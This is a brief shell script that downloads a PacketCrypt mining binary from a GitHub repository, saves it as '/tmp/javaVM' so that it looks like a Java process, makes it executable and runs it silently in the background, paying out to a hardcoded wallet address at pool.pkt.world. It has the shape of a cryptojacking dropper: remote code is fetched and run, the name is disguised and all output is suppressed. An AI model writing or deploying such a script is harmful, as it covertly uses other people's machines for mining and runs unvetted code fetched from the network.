#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/packetcrypt -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
fi
